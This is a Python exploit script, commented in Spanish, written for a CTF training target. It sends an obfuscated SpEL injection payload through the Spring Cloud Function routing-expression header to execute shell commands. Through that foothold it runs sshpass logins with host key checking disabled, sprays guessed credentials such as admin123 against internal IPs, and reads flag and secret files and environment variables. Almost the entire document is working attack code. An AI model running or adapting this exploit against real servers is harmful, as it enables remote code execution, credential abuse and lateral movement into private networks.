#!/usr/bin/env python3
"""
CTF Chile - ATAQUE SSH FINAL DIRECTO
Usar vault:admin123 para SSH a servidores internos y extraer flags
"""
import requests
import time

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

print("⚡ ATAQUE SSH FINAL - EXTRACCIÓN DIRECTA DE FLAGS")
print("=" * 60)

def build_payload(cmd):
    payload = (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + cmd.replace('"', '\\"') + '"}'
        ').waitFor()'
    )
    return payload

def ssh_and_extract_flag(host, user, password):
    """SSH a host y buscar flags directamente"""
    print(f"\n🎯 Atacando {user}@{host} con password {password}")

    # Comando SSH que busca flags inmediatamente
    ssh_cmd = f"sshpass -p '{password}' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no {user}@{host} 'echo CONEXION_EXITOSA && find / -name \"*flag*\" 2>/dev/null | head -10 && grep -r \"CTF{{\" / 2>/dev/null | head -5 && env | grep -i flag'"

    payload = build_payload(ssh_cmd)

    try:
        print("   📡 Enviando comando SSH...")
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=20)

        response = r.text.strip()
        print(f"   📄 Respuesta ({len(response)} chars): {response[:300]}...")

        # Buscar flags en la respuesta
        if "CTF{" in response or "FLAG{" in response or "flag{" in response:
            print(f"   🏆 FLAG ENCONTRADA EN {host}:")
            print(f"   {response}")
            return response

        if "CONEXION_EXITOSA" in response:
            print(f"   ✅ SSH exitoso a {host} - explorando más...")
            return "SSH_SUCCESS"

        return None

    except Exception as e:
        print(f"   ❌ Error: {e}")
        return None

# IPs internas que encontramos
internal_ips = ["10.160.209.1", "17.0.0.64", "16.0.0.64"]

# Credenciales que sabemos funcionan
credentials = [
    ("vault", "admin123"),
    ("admin", "admin123"),
    ("root", "admin123"),
    ("ctf", "admin123")
]

print("[1] Intentando SSH con credenciales vault...")

flags_found = []

for host in internal_ips:
    for user, password in credentials:
        result = ssh_and_extract_flag(host, user, password)
        if result and "CTF{" in str(result):
            flags_found.append(result)
        time.sleep(2)  # Evitar sobrecarga

print(f"\n[2] Búsqueda en directorios específicos de servidores SSH...")

# Si SSH funciona, buscar en ubicaciones específicas
for host in internal_ips:
    print(f"\n   🔍 Explorando directorios en {host}...")

    specific_searches = [
        f"sshpass -p 'admin123' ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no vault@{host} 'cat /root/flag.txt /home/*/flag.txt /flag /secret.txt 2>/dev/null'",
        f"sshpass -p 'admin123' ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no vault@{host} 'ls -la /root /home 2>/dev/null | grep flag'",
        f"sshpass -p 'admin123' ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no vault@{host} 'env | grep -iE \"(flag|ctf|secret)\"'",
    ]

    for search_cmd in specific_searches:
        payload = build_payload(search_cmd)

        try:
            r = requests.post(ROUTER, headers={
                "spring.cloud.function.routing-expression": payload,
                "Content-Type": "text/plain",
            }, data="x", timeout=15)

            response = r.text.strip()

            if response and len(response) > 20 and "error" not in response.lower():
                print(f"   📄 Resultado: {response[:200]}...")

                if "CTF{" in response or "FLAG{" in response:
                    print(f"   🏆 FLAG EN {host}: {response}")
                    flags_found.append(response)

        except:
            pass

print(f"\n" + "="*60)
print("🏆 FLAGS ENCONTRADAS:")
print("="*60)

if flags_found:
    for i, flag in enumerate(flags_found, 1):
        print(f"{i}. {flag}")
else:
    print("❌ No se extrajeron flags directamente")
    print("")
    print("🔧 DEBUGGING:")
    print("- vault:admin123 confirmado funcionando")
    print("- Servidores internos: 10.160.209.1, 17.0.0.64, 16.0.0.64")
    print("- SSH reportado exitoso anteriormente")
    print("")
    print("💡 LA FLAG PODRÍA ESTAR EN:")
    print("- Archivos que requieren permisos específicos")
    print("- Servicios en puerto 4099 que encontramos")
    print("- Requiere clave digital específica del organizador")

print("="*60)